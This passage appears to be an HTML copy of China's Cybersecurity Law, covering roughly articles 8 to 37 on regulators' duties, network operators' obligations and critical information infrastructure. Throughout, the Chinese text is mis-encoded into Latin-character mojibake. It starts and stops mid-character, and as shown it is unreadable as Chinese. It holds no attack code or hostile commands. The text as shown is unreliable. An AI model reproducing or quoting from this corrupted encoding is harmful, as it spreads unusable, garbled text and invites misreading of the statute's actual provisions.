‡å‡†åˆ¶å®šã€æ‰“å‡»ç½‘ç»œè¿æ³•çŠ¯ç½ªç­‰æ–¹é¢çš„å›½é™…äº¤æµä¸åˆä½œï¼Œæ¨åŠ¨æ„å»ºå’Œå¹³ã€å®‰å…¨ã€å¼€æ”¾ã€åˆä½œçš„ç½‘ç»œç©ºé—´ï¼Œå»ºç«‹å¤šè¾¹ã€æ°‘ä¸»ã€é€æ˜çš„ç½‘ç»œæ²»ç†ä½“ç³»ã€‚</p><p>ç¬¬å…«æ¡ã€€å›½å®¶ç½‘ä¿¡éƒ¨é—¨è´Ÿè´£ç»Ÿç­¹åè°ƒç½‘ç»œå®‰å…¨å·¥ä½œå’Œç›¸å…³ç›‘ç£ç®¡ç†å·¥ä½œã€‚å›½åŠ¡é™¢ç”µä¿¡ä¸»ç®¡éƒ¨é—¨ã€å…¬å®‰éƒ¨é—¨å’Œå…¶ä»–æœ‰å…³æœºå…³ä¾ç…§æœ¬æ³•å’Œæœ‰å…³æ³•å¾‹ã€è¡Œæ”¿æ³•è§„çš„è§„å®šï¼Œåœ¨å„è‡ªèŒè´£èŒƒå›´å†…è´Ÿè´£ç½‘ç»œå®‰å…¨ä¿æŠ¤å’Œç›‘ç£ç®¡ç†å·¥ä½œã€‚</p><p>å¿çº§ä»¥ä¸Šåœ°æ–¹äººæ°‘æ”¿åºœæœ‰å…³éƒ¨é—¨çš„ç½‘ç»œå®‰å…¨ä¿æŠ¤å’Œç›‘ç£ç®¡ç†èŒè´£ï¼ŒæŒ‰ç…§å›½å®¶æœ‰å…³è§„å®šç¡®å®šã€‚</p><p>ç¬¬ä¹æ¡ã€€ç½‘ç»œè¿è¥è€…å¼€å±•ç»è¥å’ŒæœåŠ¡æ´»åŠ¨ï¼Œå¿…é¡»éµå®ˆæ³•å¾‹ã€è¡Œæ”¿æ³•è§„ï¼Œå°Šé‡ç¤¾ä¼šå…¬å¾·ï¼Œéµå®ˆå•†ä¸šé“å¾·ï¼Œè¯šå®ä¿¡ç”¨ï¼Œå±¥è¡Œç½‘ç»œå®‰å…¨ä¿æŠ¤ä¹‰åŠ¡ï¼Œæ¥å—æ”¿åºœå’Œç¤¾ä¼šçš„ç›‘ç£ï¼Œæ‰¿æ‹…ç¤¾ä¼šè´£ä»»ã€‚</p><p>ç¬¬åæ¡ã€€å»ºè®¾ã€è¿è¥ç½‘ç»œæˆ–è€…é€šè¿‡ç½‘ç»œæä¾›æœåŠ¡ï¼Œåº”å½“ä¾ç…§æ³•å¾‹ã€è¡Œæ”¿æ³•è§„çš„è§„å®šå’Œå›½å®¶æ ‡å‡†çš„å¼ºåˆ¶æ€§è¦æ±‚ï¼Œé‡‡å–æŠ€æœ¯æªæ–½å’Œå…¶ä»–å¿…è¦æªæ–½ï¼Œä¿éšœç½‘ç»œå®‰å…¨ã€ç¨³å®šè¿è¡Œï¼Œæœ‰æ•ˆåº”å¯¹ç½‘ç»œå®‰å…¨äº‹ä»¶ï¼Œé˜²èŒƒç½‘ç»œè¿æ³•çŠ¯ç½ªæ´»åŠ¨ï¼Œç»´æŠ¤ç½‘ç»œæ•°æ®çš„å®Œæ•´æ€§ã€ä¿å¯†æ€§å’Œå¯ç”¨æ€§ã€‚</p><p>ç¬¬åä¸€æ¡ã€€ç½‘ç»œç›¸å…³è¡Œä¸šç»„ç»‡æŒ‰ç…§ç« ç¨‹ï¼ŒåŠ å¼ºè¡Œä¸šè‡ªå¾‹ï¼Œåˆ¶å®šç½‘ç»œå®‰å…¨è¡Œä¸ºè§„èŒƒï¼ŒæŒ‡å¯¼ä¼šå‘˜åŠ å¼ºç½‘ç»œå®‰å…¨ä¿æŠ¤ï¼Œæé«˜ç½‘ç»œå®‰å…¨ä¿æŠ¤æ°´å¹³ï¼Œä¿ƒè¿›è¡Œä¸šå¥åº·å‘å±•ã€‚</p><p>ç¬¬åäºŒæ¡ã€€å›½å®¶ä¿æŠ¤å…¬æ°‘ã€æ³•äººå’Œå…¶ä»–ç»„ç»‡ä¾æ³•ä½¿ç”¨ç½‘ç»œçš„æƒåˆ©ï¼Œä¿ƒè¿›ç½‘ç»œæ¥å…¥æ™®åŠï¼Œæå‡ç½‘ç»œæœåŠ¡æ°´å¹³ï¼Œä¸ºç¤¾ä¼šæä¾›å®‰å…¨ã€ä¾¿åˆ©çš„ç½‘ç»œæœåŠ¡ï¼Œä¿éšœç½‘ç»œä¿¡æ¯ä¾æ³•æœ‰åºè‡ªç”±æµåŠ¨ã€‚</p><p>ä»»ä½•ä¸ªäººå’Œç»„ç»‡ä½¿ç”¨ç½‘ç»œåº”å½“éµå®ˆå®ªæ³•æ³•å¾‹ï¼Œéµå®ˆå…¬å…±ç§©åºï¼Œå°Šé‡ç¤¾ä¼šå…¬å¾·ï¼Œä¸å¾—å±å®³ç½‘ç»œå®‰å…¨ï¼Œä¸å¾—åˆ©ç”¨ç½‘ç»œä»äº‹å±å®³å›½å®¶å®‰å…¨ã€è£èª‰å’Œåˆ©ç›Šï¼Œç…½åŠ¨é¢ è¦†å›½å®¶æ”¿æƒã€æ¨ç¿»ç¤¾ä¼šä¸»ä¹‰åˆ¶åº¦ï¼Œç…½åŠ¨åˆ†è£‚å›½å®¶ã€ç ´åå›½å®¶ç»Ÿä¸€ï¼Œå®£æ‰¬ææ€–ä¸»ä¹‰ã€æç«¯ä¸»ä¹‰ï¼Œå®£æ‰¬æ°‘æ—ä»‡æ¨ã€æ°‘æ—æ­§è§†ï¼Œä¼ æ’­æš´åŠ›ã€æ·«ç§½è‰²æƒ…ä¿¡æ¯ï¼Œç¼–é€ ã€ä¼ æ’­è™šå‡ä¿¡æ¯æ‰°ä¹±ç»æµç§©åºå’Œç¤¾ä¼šç§©åºï¼Œä»¥åŠä¾µå®³ä»–äººåèª‰ã€éšç§ã€çŸ¥è¯†äº§æƒå’Œå…¶ä»–åˆæ³•æƒç›Šç­‰æ´»åŠ¨ã€‚</p><p>ç¬¬åä¸‰æ¡ã€€å›½å®¶æ”¯æŒç ”ç©¶å¼€å‘æœ‰åˆ©äºæœªæˆå¹´äººå¥åº·æˆé•¿çš„ç½‘ç»œäº§å“å’ŒæœåŠ¡ï¼Œä¾æ³•æƒ©æ²»åˆ©ç”¨ç½‘ç»œä»äº‹å±å®³æœªæˆå¹´äººèº«å¿ƒå¥åº·çš„æ´»åŠ¨ï¼Œä¸ºæœªæˆå¹´äººæä¾›å®‰å…¨ã€å¥åº·çš„ç½‘ç»œç¯å¢ƒã€‚</p><p>ç¬¬åå››æ¡ã€€ä»»ä½•ä¸ªäººå’Œç»„ç»‡æœ‰æƒå¯¹å±å®³ç½‘ç»œå®‰å…¨çš„è¡Œä¸ºå‘ç½‘ä¿¡ã€ç”µä¿¡ã€å…¬å®‰ç­‰éƒ¨é—¨ä¸¾æŠ¥ã€‚æ”¶åˆ°ä¸¾æŠ¥çš„éƒ¨é—¨åº”å½“åŠæ—¶ä¾æ³•ä½œå‡ºå¤„ç†ï¼›ä¸å±äºæœ¬éƒ¨é—¨èŒè´£çš„ï¼Œåº”å½“åŠæ—¶ç§»é€æœ‰æƒå¤„ç†çš„éƒ¨é—¨ã€‚æœ‰å…³éƒ¨é—¨åº”å½“å¯¹ä¸¾æŠ¥äººçš„ç›¸å…³ä¿¡æ¯äºˆä»¥ä¿å¯†ï¼Œä¿æŠ¤ä¸¾æŠ¥äººçš„åˆæ³•æƒç›Šã€‚</p><h1 id="ç¬¬äºŒç« -ç½‘ç»œå®‰å…¨æ”¯æŒä¸ä¿ƒè¿›"><a href="#ç¬¬äºŒç« -ç½‘ç»œå®‰å…¨æ”¯æŒä¸ä¿ƒè¿›" class="headerlink" title="ç¬¬äºŒç« ã€€ç½‘ç»œå®‰å…¨æ”¯æŒä¸ä¿ƒè¿›"></a>ç¬¬äºŒç« ã€€ç½‘ç»œå®‰å…¨æ”¯æŒä¸ä¿ƒè¿›</h1><p>ç¬¬åäº”æ¡ã€€å›½å®¶å»ºç«‹å’Œå®Œå–„ç½‘ç»œå®‰å…¨æ ‡å‡†ä½“ç³»ã€‚å›½åŠ¡é™¢æ ‡å‡†åŒ–è¡Œæ”¿ä¸»ç®¡éƒ¨é—¨å’Œå›½åŠ¡é™¢å…¶ä»–æœ‰å…³éƒ¨é—¨æ ¹æ®å„è‡ªçš„èŒè´£ï¼Œç»„ç»‡åˆ¶å®šå¹¶é€‚æ—¶ä¿®è®¢æœ‰å…³ç½‘ç»œå®‰å…¨ç®¡ç†ä»¥åŠç½‘ç»œäº§å“ã€æœåŠ¡å’Œè¿è¡Œå®‰å…¨çš„å›½å®¶æ ‡å‡†ã€è¡Œä¸šæ ‡å‡†ã€‚</p><p>å›½å®¶æ”¯æŒä¼ä¸šã€ç ”ç©¶æœºæ„ã€é«˜ç­‰å­¦æ ¡ã€ç½‘ç»œç›¸å…³è¡Œä¸šç»„ç»‡å‚ä¸ç½‘ç»œå®‰å…¨å›½å®¶æ ‡å‡†ã€è¡Œä¸šæ ‡å‡†çš„åˆ¶å®šã€‚</p><p>ç¬¬åå…­æ¡ã€€å›½åŠ¡é™¢å’Œçœã€è‡ªæ²»åŒºã€ç›´è¾–å¸‚äººæ°‘æ”¿åºœåº”å½“ç»Ÿç­¹è§„åˆ’ï¼ŒåŠ å¤§æŠ•å…¥ï¼Œæ‰¶æŒé‡ç‚¹ç½‘ç»œå®‰å…¨æŠ€æœ¯äº§ä¸šå’Œé¡¹ç›®ï¼Œæ”¯æŒç½‘ç»œå®‰å…¨æŠ€æœ¯çš„ç ”ç©¶å¼€å‘å’Œåº”ç”¨ï¼Œæ¨å¹¿å®‰å…¨å¯ä¿¡çš„ç½‘ç»œäº§å“å’ŒæœåŠ¡ï¼Œä¿æŠ¤ç½‘ç»œæŠ€æœ¯çŸ¥è¯†äº§æƒï¼Œæ”¯æŒä¼ä¸šã€ç ”ç©¶æœºæ„å’Œé«˜ç­‰å­¦æ ¡ç­‰å‚ä¸å›½å®¶ç½‘ç»œå®‰å…¨æŠ€æœ¯åˆ›æ–°é¡¹ç›®ã€‚</p><p>ç¬¬åä¸ƒæ¡ã€€å›½å®¶æ¨è¿›ç½‘ç»œå®‰å…¨ç¤¾ä¼šåŒ–æœåŠ¡ä½“ç³»å»ºè®¾ï¼Œé¼“åŠ±æœ‰å…³ä¼ä¸šã€æœºæ„å¼€å±•ç½‘ç»œå®‰å…¨è®¤è¯ã€æ£€æµ‹å’Œé£é™©è¯„ä¼°ç­‰å®‰å…¨æœåŠ¡ã€‚</p><p>ç¬¬åå…«æ¡ã€€å›½å®¶é¼“åŠ±å¼€å‘ç½‘ç»œæ•°æ®å®‰å…¨ä¿æŠ¤å’Œåˆ©ç”¨æŠ€æœ¯ï¼Œä¿ƒè¿›å…¬å…±æ•°æ®èµ„æºå¼€æ”¾ï¼Œæ¨åŠ¨æŠ€æœ¯åˆ›æ–°å’Œç»æµç¤¾ä¼šå‘å±•ã€‚</p><p>å›½å®¶æ”¯æŒåˆ›æ–°ç½‘ç»œå®‰å…¨ç®¡ç†æ–¹å¼ï¼Œè¿ç”¨ç½‘ç»œæ–°æŠ€æœ¯ï¼Œæå‡ç½‘ç»œå®‰å…¨ä¿æŠ¤æ°´å¹³ã€‚</p><p>ç¬¬åä¹æ¡ã€€å„çº§äººæ°‘æ”¿åºœåŠå…¶æœ‰å…³éƒ¨é—¨åº”å½“ç»„ç»‡å¼€å±•ç»å¸¸æ€§çš„ç½‘ç»œå®‰å…¨å®£ä¼ æ•™è‚²ï¼Œå¹¶æŒ‡å¯¼ã€ç£ä¿ƒæœ‰å…³å•ä½åšå¥½ç½‘ç»œå®‰å…¨å®£ä¼ æ•™è‚²å·¥ä½œã€‚</p><p>å¤§ä¼—ä¼ æ’­åª’ä»‹åº”å½“æœ‰é’ˆå¯¹æ€§åœ°é¢å‘ç¤¾ä¼šè¿›è¡Œç½‘ç»œå®‰å…¨å®£ä¼ æ•™è‚²ã€‚</p><p>ç¬¬äºŒåæ¡ã€€å›½å®¶æ”¯æŒä¼ä¸šå’Œé«˜ç­‰å­¦æ ¡ã€èŒä¸šå­¦æ ¡ç­‰æ•™è‚²åŸ¹è®­æœºæ„å¼€å±•ç½‘ç»œå®‰å…¨ç›¸å…³æ•™è‚²ä¸åŸ¹è®­ï¼Œé‡‡å–å¤šç§æ–¹å¼åŸ¹å…»ç½‘ç»œå®‰å…¨äººæ‰ï¼Œä¿ƒè¿›ç½‘ç»œå®‰å…¨äººæ‰äº¤æµã€‚</p><h1 id="ç¬¬ä¸‰ç« -ç½‘ç»œè¿è¡Œå®‰å…¨"><a href="#ç¬¬ä¸‰ç« -ç½‘ç»œè¿è¡Œå®‰å…¨" class="headerlink" title="ç¬¬ä¸‰ç« ã€€ç½‘ç»œè¿è¡Œå®‰å…¨"></a>ç¬¬ä¸‰ç« ã€€ç½‘ç»œè¿è¡Œå®‰å…¨</h1><p>ç¬¬ä¸€èŠ‚ã€€ä¸€èˆ¬è§„å®š</p><p>ç¬¬äºŒåä¸€æ¡ã€€å›½å®¶å®è¡Œç½‘ç»œå®‰å…¨ç­‰çº§ä¿æŠ¤åˆ¶åº¦ã€‚ç½‘ç»œè¿è¥è€…åº”å½“æŒ‰ç…§ç½‘ç»œå®‰å…¨ç­‰çº§ä¿æŠ¤åˆ¶åº¦çš„è¦æ±‚ï¼Œå±¥è¡Œä¸‹åˆ—å®‰å…¨ä¿æŠ¤ä¹‰åŠ¡ï¼Œä¿éšœç½‘ç»œå…å—å¹²æ‰°ã€ç ´åæˆ–è€…æœªç»æˆæƒçš„è®¿é—®ï¼Œé˜²æ­¢ç½‘ç»œæ•°æ®æ³„éœ²æˆ–è€…è¢«çªƒå–ã€ç¯¡æ”¹ï¼š</p><p>ï¼ˆä¸€ï¼‰åˆ¶å®šå†…éƒ¨å®‰å…¨ç®¡ç†åˆ¶åº¦å’Œæ“ä½œè§„ç¨‹ï¼Œç¡®å®šç½‘ç»œå®‰å…¨è´Ÿè´£äººï¼Œè½å®ç½‘ç»œå®‰å…¨ä¿æŠ¤è´£ä»»ï¼›</p><p>ï¼ˆäºŒï¼‰é‡‡å–é˜²èŒƒè®¡ç®—æœºç—…æ¯’å’Œç½‘ç»œæ”»å‡»ã€ç½‘ç»œä¾µå…¥ç­‰å±å®³ç½‘ç»œå®‰å…¨è¡Œä¸ºçš„æŠ€æœ¯æªæ–½ï¼›</p><p>ï¼ˆä¸‰ï¼‰é‡‡å–ç›‘æµ‹ã€è®°å½•ç½‘ç»œè¿è¡ŒçŠ¶æ€ã€ç½‘ç»œå®‰å…¨äº‹ä»¶çš„æŠ€æœ¯æªæ–½ï¼Œå¹¶æŒ‰ç…§è§„å®šç•™å­˜ç›¸å…³çš„ç½‘ç»œæ—¥å¿—ä¸å°‘äºå…­ä¸ªæœˆï¼›</p><p>ï¼ˆå››ï¼‰é‡‡å–æ•°æ®åˆ†ç±»ã€é‡è¦æ•°æ®å¤‡ä»½å’ŒåŠ å¯†ç­‰æªæ–½ï¼›</p><p>ï¼ˆäº”ï¼‰æ³•å¾‹ã€è¡Œæ”¿æ³•è§„è§„å®šçš„å…¶ä»–ä¹‰åŠ¡ã€‚</p><p>ç¬¬äºŒåäºŒæ¡ã€€ç½‘ç»œäº§å“ã€æœåŠ¡åº”å½“ç¬¦åˆç›¸å…³å›½å®¶æ ‡å‡†çš„å¼ºåˆ¶æ€§è¦æ±‚ã€‚ç½‘ç»œäº§å“ã€æœåŠ¡çš„æä¾›è€…ä¸å¾—è®¾ç½®æ¶æ„ç¨‹åºï¼›å‘ç°å…¶ç½‘ç»œäº§å“ã€æœåŠ¡å­˜åœ¨å®‰å…¨ç¼ºé™·ã€æ¼æ´ç­‰é£é™©æ—¶ï¼Œåº”å½“ç«‹å³é‡‡å–è¡¥æ•‘æªæ–½ï¼ŒæŒ‰ç…§è§„å®šåŠæ—¶å‘ŠçŸ¥ç”¨æˆ·å¹¶å‘æœ‰å…³ä¸»ç®¡éƒ¨é—¨æŠ¥å‘Šã€‚</p><p>ç½‘ç»œäº§å“ã€æœåŠ¡çš„æä¾›è€…åº”å½“ä¸ºå…¶äº§å“ã€æœåŠ¡æŒç»­æä¾›å®‰å…¨ç»´æŠ¤ï¼›åœ¨è§„å®šæˆ–è€…å½“äº‹äººçº¦å®šçš„æœŸé™å†…ï¼Œä¸å¾—ç»ˆæ­¢æä¾›å®‰å…¨ç»´æŠ¤ã€‚</p><p>ç½‘ç»œäº§å“ã€æœåŠ¡å…·æœ‰æ”¶é›†ç”¨æˆ·ä¿¡æ¯åŠŸèƒ½çš„ï¼Œå…¶æä¾›è€…åº”å½“å‘ç”¨æˆ·æ˜ç¤ºå¹¶å–å¾—åŒæ„ï¼›æ¶‰åŠç”¨æˆ·ä¸ªäººä¿¡æ¯çš„ï¼Œè¿˜åº”å½“éµå®ˆæœ¬æ³•å’Œæœ‰å…³æ³•å¾‹ã€è¡Œæ”¿æ³•è§„å…³äºä¸ªäººä¿¡æ¯ä¿æŠ¤çš„è§„å®šã€‚</p><p>ç¬¬äºŒåä¸‰æ¡ã€€ç½‘ç»œå…³é”®è®¾å¤‡å’Œç½‘ç»œå®‰å…¨ä¸“ç”¨äº§å“åº”å½“æŒ‰ç…§ç›¸å…³å›½å®¶æ ‡å‡†çš„å¼ºåˆ¶æ€§è¦æ±‚ï¼Œç”±å…·å¤‡èµ„æ ¼çš„æœºæ„å®‰å…¨è®¤è¯åˆæ ¼æˆ–è€…å®‰å…¨æ£€æµ‹ç¬¦åˆè¦æ±‚åï¼Œæ–¹å¯é”€å”®æˆ–è€…æä¾›ã€‚å›½å®¶ç½‘ä¿¡éƒ¨é—¨ä¼šåŒå›½åŠ¡é™¢æœ‰å…³éƒ¨é—¨åˆ¶å®šã€å…¬å¸ƒç½‘ç»œå…³é”®è®¾å¤‡å’Œç½‘ç»œå®‰å…¨ä¸“ç”¨äº§å“ç›®å½•ï¼Œå¹¶æ¨åŠ¨å®‰å…¨è®¤è¯å’Œå®‰å…¨æ£€æµ‹ç»“æœäº’è®¤ï¼Œé¿å…é‡å¤è®¤è¯ã€æ£€æµ‹ã€‚</p><p>ç¬¬äºŒåå››æ¡ã€€ç½‘ç»œè¿è¥è€…ä¸ºç”¨æˆ·åŠç†ç½‘ç»œæ¥å…¥ã€åŸŸåæ³¨å†ŒæœåŠ¡ï¼ŒåŠç†å›ºå®šç”µè¯ã€ç§»åŠ¨ç”µè¯ç­‰å…¥ç½‘æ‰‹ç»­ï¼Œæˆ–è€…ä¸ºç”¨æˆ·æä¾›ä¿¡æ¯å‘å¸ƒã€å³æ—¶é€šè®¯ç­‰æœåŠ¡ï¼Œåœ¨ä¸ç”¨æˆ·ç­¾è®¢åè®®æˆ–è€…ç¡®è®¤æä¾›æœåŠ¡æ—¶ï¼Œåº”å½“è¦æ±‚ç”¨æˆ·æä¾›çœŸå®èº«ä»½ä¿¡æ¯ã€‚ç”¨æˆ·ä¸æä¾›çœŸå®èº«ä»½ä¿¡æ¯çš„ï¼Œç½‘ç»œè¿è¥è€…ä¸å¾—ä¸ºå…¶æä¾›ç›¸å…³æœåŠ¡ã€‚</p><p>å›½å®¶å®æ–½ç½‘ç»œå¯ä¿¡èº«ä»½æˆ˜ç•¥ï¼Œæ”¯æŒç ”ç©¶å¼€å‘å®‰å…¨ã€æ–¹ä¾¿çš„ç”µå­èº«ä»½è®¤è¯æŠ€æœ¯ï¼Œæ¨åŠ¨ä¸åŒç”µå­èº«ä»½è®¤è¯ä¹‹é—´çš„äº’è®¤ã€‚</p><p>ç¬¬äºŒåäº”æ¡ã€€ç½‘ç»œè¿è¥è€…åº”å½“åˆ¶å®šç½‘ç»œå®‰å…¨äº‹ä»¶åº”æ€¥é¢„æ¡ˆï¼ŒåŠæ—¶å¤„ç½®ç³»ç»Ÿæ¼æ´ã€è®¡ç®—æœºç—…æ¯’ã€ç½‘ç»œæ”»å‡»ã€ç½‘ç»œä¾µå…¥ç­‰å®‰å…¨é£é™©ï¼›åœ¨å‘ç”Ÿå±å®³ç½‘ç»œå®‰å…¨çš„äº‹ä»¶æ—¶ï¼Œç«‹å³å¯åŠ¨åº”æ€¥é¢„æ¡ˆï¼Œé‡‡å–ç›¸åº”çš„è¡¥æ•‘æªæ–½ï¼Œå¹¶æŒ‰ç…§è§„å®šå‘æœ‰å…³ä¸»ç®¡éƒ¨é—¨æŠ¥å‘Šã€‚</p><p>ç¬¬äºŒåå…­æ¡ã€€å¼€å±•ç½‘ç»œå®‰å…¨è®¤è¯ã€æ£€æµ‹ã€é£é™©è¯„ä¼°ç­‰æ´»åŠ¨ï¼Œå‘ç¤¾ä¼šå‘å¸ƒç³»ç»Ÿæ¼æ´ã€è®¡ç®—æœºç—…æ¯’ã€ç½‘ç»œæ”»å‡»ã€ç½‘ç»œä¾µå…¥ç­‰ç½‘ç»œå®‰å…¨ä¿¡æ¯ï¼Œåº”å½“éµå®ˆå›½å®¶æœ‰å…³è§„å®šã€‚</p><p>ç¬¬äºŒåä¸ƒæ¡ã€€ä»»ä½•ä¸ªäººå’Œç»„ç»‡ä¸å¾—ä»äº‹éæ³•ä¾µå…¥ä»–äººç½‘ç»œã€å¹²æ‰°ä»–äººç½‘ç»œæ­£å¸¸åŠŸèƒ½ã€çªƒå–ç½‘ç»œæ•°æ®ç­‰å±å®³ç½‘ç»œå®‰å…¨çš„æ´»åŠ¨ï¼›ä¸å¾—æä¾›ä¸“é—¨ç”¨äºä»äº‹ä¾µå…¥ç½‘ç»œã€å¹²æ‰°ç½‘ç»œæ­£å¸¸åŠŸèƒ½åŠé˜²æŠ¤æªæ–½ã€çªƒå–ç½‘ç»œæ•°æ®ç­‰å±å®³ç½‘ç»œå®‰å…¨æ´»åŠ¨çš„ç¨‹åºã€å·¥å…·ï¼›æ˜çŸ¥ä»–äººä»äº‹å±å®³ç½‘ç»œå®‰å…¨çš„æ´»åŠ¨çš„ï¼Œä¸å¾—ä¸ºå…¶æä¾›æŠ€æœ¯æ”¯æŒã€å¹¿å‘Šæ¨å¹¿ã€æ”¯ä»˜ç»“ç®—ç­‰å¸®åŠ©ã€‚</p><p>ç¬¬äºŒåå…«æ¡ã€€ç½‘ç»œè¿è¥è€…åº”å½“ä¸ºå…¬å®‰æœºå…³ã€å›½å®¶å®‰å…¨æœºå…³ä¾æ³•ç»´æŠ¤å›½å®¶å®‰å…¨å’Œä¾¦æŸ¥çŠ¯ç½ªçš„æ´»åŠ¨æä¾›æŠ€æœ¯æ”¯æŒå’ŒååŠ©ã€‚</p><p>ç¬¬äºŒåä¹æ¡ã€€å›½å®¶æ”¯æŒç½‘ç»œè¿è¥è€…ä¹‹é—´åœ¨ç½‘ç»œå®‰å…¨ä¿¡æ¯æ”¶é›†ã€åˆ†æã€é€šæŠ¥å’Œåº”æ€¥å¤„ç½®ç­‰æ–¹é¢è¿›è¡Œåˆä½œï¼Œæé«˜ç½‘ç»œè¿è¥è€…çš„å®‰å…¨ä¿éšœèƒ½åŠ›ã€‚</p><p>æœ‰å…³è¡Œä¸šç»„ç»‡å»ºç«‹å¥å…¨æœ¬è¡Œä¸šçš„ç½‘ç»œå®‰å…¨ä¿æŠ¤è§„èŒƒå’Œåä½œæœºåˆ¶ï¼ŒåŠ å¼ºå¯¹ç½‘ç»œå®‰å…¨é£é™©çš„åˆ†æè¯„ä¼°ï¼Œå®šæœŸå‘ä¼šå‘˜è¿›è¡Œé£é™©è­¦ç¤ºï¼Œæ”¯æŒã€ååŠ©ä¼šå‘˜åº”å¯¹ç½‘ç»œå®‰å…¨é£é™©ã€‚</p><p>ç¬¬ä¸‰åæ¡ã€€ç½‘ä¿¡éƒ¨é—¨å’Œæœ‰å…³éƒ¨é—¨åœ¨å±¥è¡Œç½‘ç»œå®‰å…¨ä¿æŠ¤èŒè´£ä¸­è·å–çš„ä¿¡æ¯ï¼Œåªèƒ½ç”¨äºç»´æŠ¤ç½‘ç»œå®‰å…¨çš„éœ€è¦ï¼Œä¸å¾—ç”¨äºå…¶ä»–ç”¨é€”ã€‚</p><p>ç¬¬äºŒèŠ‚ã€€å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½çš„è¿è¡Œå®‰å…¨</p><p>ç¬¬ä¸‰åä¸€æ¡ã€€å›½å®¶å¯¹å…¬å…±é€šä¿¡å’Œä¿¡æ¯æœåŠ¡ã€èƒ½æºã€äº¤é€šã€æ°´åˆ©ã€é‡‘èã€å…¬å…±æœåŠ¡ã€ç”µå­æ”¿åŠ¡ç­‰é‡è¦è¡Œä¸šå’Œé¢†åŸŸï¼Œä»¥åŠå…¶ä»–ä¸€æ—¦é­åˆ°ç ´åã€ä¸§å¤±åŠŸèƒ½æˆ–è€…æ•°æ®æ³„éœ²ï¼Œå¯èƒ½ä¸¥é‡å±å®³å›½å®¶å®‰å…¨ã€å›½è®¡æ°‘ç”Ÿã€å…¬å…±åˆ©ç›Šçš„å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½ï¼Œåœ¨ç½‘ç»œå®‰å…¨ç­‰çº§ä¿æŠ¤åˆ¶åº¦çš„åŸºç¡€ä¸Šï¼Œå®è¡Œé‡ç‚¹ä¿æŠ¤ã€‚å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½çš„å…·ä½“èŒƒå›´å’Œå®‰å…¨ä¿æŠ¤åŠæ³•ç”±å›½åŠ¡é™¢åˆ¶å®šã€‚</p><p>å›½å®¶é¼“åŠ±å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½ä»¥å¤–çš„ç½‘ç»œè¿è¥è€…è‡ªæ„¿å‚ä¸å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½ä¿æŠ¤ä½“ç³»ã€‚</p><p>ç¬¬ä¸‰åäºŒæ¡ã€€æŒ‰ç…§å›½åŠ¡é™¢è§„å®šçš„èŒè´£åˆ†å·¥ï¼Œè´Ÿè´£å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½å®‰å…¨ä¿æŠ¤å·¥ä½œçš„éƒ¨é—¨åˆ†åˆ«ç¼–åˆ¶å¹¶ç»„ç»‡å®æ–½æœ¬è¡Œä¸šã€æœ¬é¢†åŸŸçš„å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½å®‰å…¨è§„åˆ’ï¼ŒæŒ‡å¯¼å’Œç›‘ç£å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½è¿è¡Œå®‰å…¨ä¿æŠ¤å·¥ä½œã€‚</p><p>ç¬¬ä¸‰åä¸‰æ¡ã€€å»ºè®¾å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½åº”å½“ç¡®ä¿å…¶å…·æœ‰æ”¯æŒä¸šåŠ¡ç¨³å®šã€æŒç»­è¿è¡Œçš„æ€§èƒ½ï¼Œå¹¶ä¿è¯å®‰å…¨æŠ€æœ¯æªæ–½åŒæ­¥è§„åˆ’ã€åŒæ­¥å»ºè®¾ã€åŒæ­¥ä½¿ç”¨ã€‚</p><p>ç¬¬ä¸‰åå››æ¡ã€€é™¤æœ¬æ³•ç¬¬äºŒåä¸€æ¡çš„è§„å®šå¤–ï¼Œå…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½çš„è¿è¥è€…è¿˜åº”å½“å±¥è¡Œä¸‹åˆ—å®‰å…¨ä¿æŠ¤ä¹‰åŠ¡ï¼š</p><p>ï¼ˆä¸€ï¼‰è®¾ç½®ä¸“é—¨å®‰å…¨ç®¡ç†æœºæ„å’Œå®‰å…¨ç®¡ç†è´Ÿè´£äººï¼Œå¹¶å¯¹è¯¥è´Ÿè´£äººå’Œå…³é”®å²—ä½çš„äººå‘˜è¿›è¡Œå®‰å…¨èƒŒæ™¯å®¡æŸ¥ï¼›</p><p>ï¼ˆäºŒï¼‰å®šæœŸå¯¹ä»ä¸šäººå‘˜è¿›è¡Œç½‘ç»œå®‰å…¨æ•™è‚²ã€æŠ€æœ¯åŸ¹è®­å’ŒæŠ€èƒ½è€ƒæ ¸ï¼›</p><p>ï¼ˆä¸‰ï¼‰å¯¹é‡è¦ç³»ç»Ÿå’Œæ•°æ®åº“è¿›è¡Œå®¹ç¾å¤‡ä»½ï¼›</p><p>ï¼ˆå››ï¼‰åˆ¶å®šç½‘ç»œå®‰å…¨äº‹ä»¶åº”æ€¥é¢„æ¡ˆï¼Œå¹¶å®šæœŸè¿›è¡Œæ¼”ç»ƒï¼›</p><p>ï¼ˆäº”ï¼‰æ³•å¾‹ã€è¡Œæ”¿æ³•è§„è§„å®šçš„å…¶ä»–ä¹‰åŠ¡ã€‚</p><p>ç¬¬ä¸‰åäº”æ¡ã€€å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½çš„è¿è¥è€…é‡‡è´­ç½‘ç»œäº§å“å’ŒæœåŠ¡ï¼Œå¯èƒ½å½±å“å›½å®¶å®‰å…¨çš„ï¼Œåº”å½“é€šè¿‡å›½å®¶ç½‘ä¿¡éƒ¨é—¨ä¼šåŒå›½åŠ¡é™¢æœ‰å…³éƒ¨é—¨ç»„ç»‡çš„å›½å®¶å®‰å…¨å®¡æŸ¥ã€‚</p><p>ç¬¬ä¸‰åå…­æ¡ã€€å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½çš„è¿è¥è€…é‡‡è´­ç½‘ç»œäº§å“å’ŒæœåŠ¡ï¼Œåº”å½“æŒ‰ç…§è§„å®šä¸æä¾›è€…ç­¾è®¢å®‰å…¨ä¿å¯†åè®®ï¼Œæ˜ç¡®å®‰å…¨å’Œä¿å¯†ä¹‰åŠ¡ä¸è´£ä»»ã€‚</p><p>ç¬¬ä¸‰åä¸ƒæ¡ã€€å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½çš„è¿è¥è€…åœ¨ä¸­åäººæ°‘å